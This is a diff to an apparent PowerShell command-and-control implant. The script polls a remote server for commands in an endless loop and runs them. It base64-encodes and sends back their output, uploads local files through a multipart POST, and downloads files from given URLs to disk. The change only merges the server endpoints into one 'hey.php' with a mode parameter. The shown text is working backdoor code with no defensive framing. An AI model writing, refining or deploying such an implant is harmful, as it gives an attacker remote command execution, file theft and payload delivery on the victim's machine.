@@ -22,12 +22,12 @@ $Hello = "$($a) $($id) $($b)"
 $EncHelloBytes = [System.Text.Encoding]::UTF8.GetBytes($Hello)
 $EncHello = [System.Convert]::ToBase64String($EncHelloBytes)
 
-$hello=(Invoke-WebRequest "$url/res.php?res=$EncHello&id=$id")
+$hello=(Invoke-WebRequest "$url/hey.php?m=res&res=$EncHello&id=$id")
 
 while($true)
 {
 
-$Content=(Invoke-WebRequest "$url/cmds.php?id=789&o=W").Content
+$Content=(Invoke-WebRequest "$url/hey.php?m=cmds&id=789&o=W").Content
 
 if ([string]::IsNullOrWhiteSpace($Content))
     {
@@ -66,12 +66,12 @@ if ($act -eq "run")
     {	
 	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes("Command executed but no Output")
         $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
-	$gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
+	$gimme=(Invoke-WebRequest "$url/hey.php?m=res&res=$EncOutput&id=$id")
         continue
     }
 	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
         $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
-        $gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
+        $gimme=(Invoke-WebRequest "$url/hey.php?m=res&res=$EncOutput&id=$id")
 }  
 if ($act -eq "download")
 {
@@ -101,8 +101,8 @@ $d = "$($c) $($file)"
 $EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
 $Encd = [System.Convert]::ToBase64String($EncdBytes)
 
-$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&id=$id")
-$up=(Invoke-RestMethod -Uri "$url/up.php?id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)
+$resup=(Invoke-WebRequest "$url/hey.php?m=res&res=$Encd&id=$id")
+$up=(Invoke-RestMethod -Uri "$url/hey.php?m=up&id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)
 
 
 
@@ -128,7 +128,7 @@ $d = "$($c) $($urldl) $($path)"
 $EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
 $Encd = [System.Convert]::ToBase64String($EncdBytes)
 
-$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&id=$id")
+$resup=(Invoke-WebRequest "$url/hey.php?m=res&res=$Encd&id=$id")
 $down= (Invoke-WebRequest -Uri $urldl -OutFile $path)
 
 
